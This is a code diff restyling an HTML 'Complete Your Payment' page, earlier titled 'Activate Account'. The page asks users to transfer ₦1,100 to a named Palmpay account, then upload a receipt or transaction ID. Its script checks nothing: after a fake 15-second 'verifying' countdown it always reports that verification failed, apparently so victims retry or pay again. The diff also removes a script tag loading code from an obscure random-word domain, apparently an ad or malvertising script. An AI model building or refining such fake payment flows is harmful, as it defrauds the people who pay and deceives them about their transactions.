@@ -3,195 +3,452 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Activate Account</title>
+    <title>Complete Your Payment</title>
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+    />
     <style>
-      body {
-        font-family: Arial, sans-serif;
+      :root {
+        --primary: #1e40af;
+        --primary-light: #3b82f6;
+        --secondary: #f97316;
+        --secondary-hover: #ea580c;
+        --light: #f8fafc;
+        --dark: #0f172a;
+        --success: #22c55e;
+        --error: #ef4444;
+        --border-radius: 8px;
+        --shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+      }
+
+      * {
         margin: 0;
         padding: 0;
-        background: #3d260e;
+        box-sizing: border-box;
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      }
+
+      body {
+        background: linear-gradient(135deg, #1e293b, #0f172a);
+        min-height: 100vh;
         display: flex;
         align-items: center;
         justify-content: center;
-        height: 100vh;
+        padding: 20px;
+        color: var(--dark);
       }
 
       .container {
-        display: flex;
-        width: 90%;
-        max-width: 800px;
+        width: 100%;
+        max-width: 500px;
         background: white;
-        border-radius: 10px;
-        box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
+        border-radius: var(--border-radius);
+        box-shadow: var(--shadow);
+        overflow: hidden;
       }
 
-      .logo {
-        width: 80px;
-      }
-
-      main {
-        width: 80%;
+      .header {
+        background: var(--primary);
+        color: white;
         padding: 20px;
-      }
-
-      .payment-box {
         text-align: center;
       }
 
-      .amount {
+      .header h1 {
         font-size: 24px;
+        margin-bottom: 5px;
+      }
+
+      .logo {
+        width: 60px;
+        margin-bottom: 15px;
+      }
+
+      .payment-summary {
+        background: #f1f5f9;
+        padding: 20px;
+        text-align: center;
+        border-bottom: 1px solid #e2e8f0;
+      }
+
+      .amount {
+        font-size: 32px;
         font-weight: bold;
-        color: #007784;
+        color: var(--primary);
+        margin: 10px 0;
+      }
+
+      .amount-details {
+        display: flex;
+        justify-content: center;
+        gap: 20px;
+        font-size: 14px;
+        color: #64748b;
+      }
+
+      .main-content {
+        padding: 25px;
+      }
+
+      .payment-method {
+        margin-bottom: 25px;
+      }
+
+      .payment-method-title {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        margin-bottom: 15px;
+        color: var(--primary);
+        font-weight: 600;
       }
 
       .account-details {
-        background: #eef6f6;
-        padding: 10px;
-        border-radius: 5px;
-        margin-left: 20px;
-        margin-right: -10px;
+        background: #f8fafc;
+        border: 1px solid #e2e8f0;
+        border-radius: var(--border-radius);
+        padding: 15px;
+        margin-bottom: 20px;
+      }
+
+      .account-name {
+        font-size: 14px;
+        color: #64748b;
+        margin-bottom: 8px;
+      }
+
+      .account-number-container {
+        display: flex;
         align-items: center;
+        justify-content: space-between;
+        margin-bottom: 10px;
       }
 
       .account-number {
-        font-size: 20px;
-        font-weight: bold;
-        color: #007784;
+        font-size: 24px;
+        font-weight: 700;
+        letter-spacing: 1px;
+        color: var(--primary);
       }
 
-      button {
-        background: #ff9800;
+      .copy-btn {
+        background: #e2e8f0;
         border: none;
-        color: white;
-        padding: 10px;
-        width: 90%;
-        margin-top: 10px;
-        margin-right: -30px;
+        width: 35px;
+        height: 35px;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
         cursor: pointer;
-        border-radius: 5px;
+        transition: all 0.2s;
+      }
+
+      .copy-btn:hover {
+        background: #cbd5e1;
+      }
+
+      .bank-name {
+        font-weight: 600;
+        margin-bottom: 5px;
+      }
+
+      .btn {
+        width: 100%;
+        padding: 14px;
+        border: none;
+        border-radius: var(--border-radius);
         font-size: 16px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: all 0.2s;
+      }
+
+      .btn-primary {
+        background: var(--secondary);
+        color: white;
+      }
+
+      .btn-primary:hover {
+        background: var(--secondary-hover);
+      }
+
+      .btn-secondary {
+        background: var(--primary);
+        color: white;
+        margin-top: 10px;
+      }
+
+      .btn-secondary:hover {
+        background: var(--primary-light);
+      }
+
+      .upload-section {
+        margin-top: 20px;
+        padding: 20px;
+        background: #f8fafc;
+        border-radius: var(--border-radius);
+        border: 1px dashed #cbd5e1;
+      }
+
+      .file-upload-container {
+        position: relative;
+        margin: 15px 0;
+      }
+
+      .file-upload-label {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        padding: 20px;
+        background: white;
+        border: 1px dashed #cbd5e1;
+        border-radius: var(--border-radius);
+        cursor: pointer;
+      }
+
+      .file-upload-label i {
+        font-size: 24px;
+        color: var(--primary);
+        margin-bottom: 10px;
+      }
+
+      .file-upload-input {
+        position: absolute;
+        width: 0;
+        height: 0;
+        opacity: 0;
+      }
+
+      .file-name {
+        margin-top: 10px;
+        font-size: 14px;
+        color: var(--primary);
+      }
+
+      .divider {
+        display: flex;
+        align-items: center;
+        margin: 20px 0;
+        color: #64748b;
+      }
+
+      .divider:before,
+      .divider:after {
+        content: "";
+        flex: 1;
+        border-bottom: 1px solid #e2e8f0;
+      }
+
+      .divider span {
+        padding: 0 10px;
+      }
+
+      .form-input {
+        width: 100%;
+        padding: 12px 15px;
+        border: 1px solid #cbd5e1;
+        border-radius: var(--border-radius);
+        font-size: 16px;
+        margin-bottom: 15px;
+      }
+
+      .form-input:focus {
+        outline: none;
+        border-color: var(--primary-light);
+      }
+
+      .countdown {
+        text-align: center;
+        padding: 20px;
+        font-size: 18px;
+        color: var(--primary);
+      }
+
+      .countdown span {
+        font-weight: bold;
+      }
+
+      .error-message {
+        background: #fef2f2;
+        color: var(--error);
+        padding: 12px;
+        border-radius: var(--border-radius);
+        border-left: 4px solid var(--error);
+        margin-top: 20px;
+        text-align: center;
       }
 
       .hidden {
         display: none;
       }
 
-      #upload-section {
-        margin-top: 20px;
-        padding: 10px;
-        background: #f8f8f8;
-        border-radius: 5px;
-      }
-
-      input[type="text"],
-      input[type="file"] {
-        width: 100%;
-        padding: 10px;
-        margin-top: 10px;
-        border: 1px solid #ccc;
-        border-radius: 5px;
-      }
-
-      #errorMsg {
-        color: red;
+      .success-message {
+        text-align: center;
+        color: var(--success);
+        padding: 15px;
         font-weight: bold;
-        margin-top: 10px;
-      }
-
-      #countdown {
-        font-size: 18px;
-        font-weight: bold;
-        color: blue;
-        margin-top: 10px;
       }
     </style>
-    <script src="script.js" defer></script>
-    <script
-      src="https://kit.fontawesome.com/a076d05399.js"
-      crossorigin="anonymous"
-    ></script>
   </head>
   <body>
     <div class="container">
-      <main>
-        <div class="payment-box">
-          <h2>Amount to Pay</h2>
-          <p class="amount">₦1,100.00</p>
-          <p>Amount <strong>₦1,100.00</strong> | Fee <strong>₦0.00</strong></p>
+      <div class="header">
+        <h1>Complete Your Payment</h1>
+        <p>Secure payment processing</p>
+      </div>
 
-          <h3><i class="fas fa-paper-plane"></i> Pay with Transfer</h3>
-          <p>Transfer to the account details below</p>
+      <div class="payment-summary">
+        <h2>Amount to Pay</h2>
+        <div class="amount">₦1,100.00</div>
+        <div class="amount-details">
+          <span>Amount: <strong>₦1,100.00</strong></span>
+          <span>Fee: <strong>₦0.00</strong></span>
+        </div>
+      </div>
 
-          <div class="account-details">
-            <h4>Palmpay</h4>
-            <p class="account-number">6602270948 <i class="fas fa-copy"></i></p>
-
-            <p><strong>Account Name:</strong>BETASUBBOL</p>
+      <div class="main-content">
+        <div class="payment-method">
+          <div class="payment-method-title">
+            <i class="fas fa-paper-plane"></i>
+            <span>Pay with Bank Transfer</span>
           </div>
+          <p>Transfer to the account details below to complete your payment</p>
+        </div>
 
-          <button id="transferredBtn">I've transferred the money</button>
-
-          <div id="upload-section" class="hidden">
-            <label for="receiptUpload"
-              ><i class="fas fa-upload"></i> Upload Receipt</label
+        <div class="account-details">
+          <div class="bank-name">Palmpay</div>
+          <div class="account-number-container">
+            <div class="account-number">6602270948</div>
+            <button
+              class="copy-btn"
+              id="copyAccountBtn"
+              title="Copy account number"
             >
-            <input type="file" id="receiptUpload" accept="image/*" />
-
-            <p>OR</p>
-
-            <input
-              type="text"
-              id="transactionId"
-              placeholder="Enter Transaction ID"
-            />
-
-            <button id="confirmBtn">Confirm</button>
+              <i class="fas fa-copy"></i>
+            </button>
           </div>
-
-          <div id="countdown" class="hidden">
-            Please wait <span id="countdownTimer">15</span> seconds...
-          </div>
-          <div id="errorMsg" class="hidden">
-            Transaction is invalid. Please retry.
+          <div class="account-name">
+            Account Name: <strong>BETASUBBOL</strong>
           </div>
         </div>
-      </main>
+
+        <button class="btn btn-primary" id="transferredBtn">
+          I've Completed the Transfer
+        </button>
+
+        <div id="upload-section" class="upload-section hidden">
+          <h3>Verify Your Payment</h3>
+          <p>Upload your payment receipt or provide transaction ID</p>
+
+          <div class="file-upload-container">
+            <label class="file-upload-label" for="receiptUpload">
+              <i class="fas fa-cloud-upload-alt"></i>
+              <span>Upload Receipt</span>
+              <span class="file-name" id="fileName">No file selected</span>
+            </label>
+            <input
+              type="file"
+              id="receiptUpload"
+              class="file-upload-input"
+              accept="image/*"
+            />
+          </div>
+
+          <div class="divider"><span>OR</span></div>
+
+          <input
+            type="text"
+            id="transactionId"
+            class="form-input"
+            placeholder="Enter Transaction ID"
+          />
+
+          <button class="btn btn-secondary" id="confirmBtn">
+            Verify Payment
+          </button>
+        </div>
+
+        <div id="countdown" class="countdown hidden">
+          <i class="fas fa-spinner fa-spin"></i>
+          <p>
+            Verifying your payment...
+            <span id="countdownTimer">15</span> seconds remaining
+          </p>
+        </div>
+
+        <div id="errorMsg" class="error-message hidden">
+          <i class="fas fa-exclamation-circle"></i> Transaction verification
+          failed. Please check your details and try again.
+        </div>
+      </div>
     </div>
+
     <script>
+      // Copy account number functionality
       document
-        .getElementById("transferredBtn")
-        .addEventListener("click", () => {
-          document.getElementById("upload-section").classList.remove("hidden");
+        .getElementById("copyAccountBtn")
+        .addEventListener("click", function () {
+          const accountNumber = "6602270948";
+          navigator.clipboard.writeText(accountNumber).then(() => {
+            this.innerHTML = '<i class="fas fa-check"></i>';
+            setTimeout(() => {
+              this.innerHTML = '<i class="fas fa-copy"></i>';
+            }, 2000);
+          });
         });
 
-      document.getElementById("confirmBtn").addEventListener("click", () => {
-        let transactionId = document.getElementById("transactionId").value;
-        let receipt = document.getElementById("receiptUpload").files.length;
-
-        if (transactionId.trim() === "" && receipt === 0) {
-          alert("Please upload a receipt or enter transaction ID!");
-          return;
-        }
-
-        document.getElementById("upload-section").classList.add("hidden");
-        document.getElementById("countdown").classList.remove("hidden");
-
-        let countdown = 15;
-        let timer = setInterval(() => {
-          document.getElementById("countdownTimer").innerText = countdown;
-          countdown--;
-
-          if (countdown < 0) {
-            clearInterval(timer);
-            document.getElementById("countdown").classList.add("hidden");
-            document.getElementById("errorMsg").classList.remove("hidden");
+      // File upload display
+      document
+        .getElementById("receiptUpload")
+        .addEventListener("change", function () {
+          if (this.files.length > 0) {
+            document.getElementById("fileName").textContent =
+              this.files[0].name;
+          } else {
+            document.getElementById("fileName").textContent =
+              "No file selected";
           }
-        }, 1000);
-      });
+        });
+
+      // I've transferred button
+      document
+        .getElementById("transferredBtn")
+        .addEventListener("click", function () {
+          document.getElementById("upload-section").classList.remove("hidden");
+          this.classList.add("hidden");
+        });
+
+      // Confirm button
+      document
+        .getElementById("confirmBtn")
+        .addEventListener("click", function () {
+          let transactionId = document.getElementById("transactionId").value;
+          let receipt = document.getElementById("receiptUpload").files.length;
+
+          if (transactionId.trim() === "" && receipt === 0) {
+            alert(
+              "Please upload a receipt or enter transaction ID to verify your payment!"
+            );
+            return;
+          }
+
+          document.getElementById("upload-section").classList.add("hidden");
+          document.getElementById("countdown").classList.remove("hidden");
+
+          let countdown = 15;
+          let timer = setInterval(() => {
+            document.getElementById("countdownTimer").innerText = countdown;
+            countdown--;
+
+            if (countdown < 0) {
+              clearInterval(timer);
+              document.getElementById("countdown").classList.add("hidden");
+              document.getElementById("errorMsg").classList.remove("hidden");
+            }
+          }, 1000);
+        });
     </script>
-    <script
-      type="text/javascript"
-      src="//slushhelmetmirth.com/39/2a/0d/392a0d28346a0e19cd71e87eccfdecf0.js"
-    ></script>
   </body>
 </html>
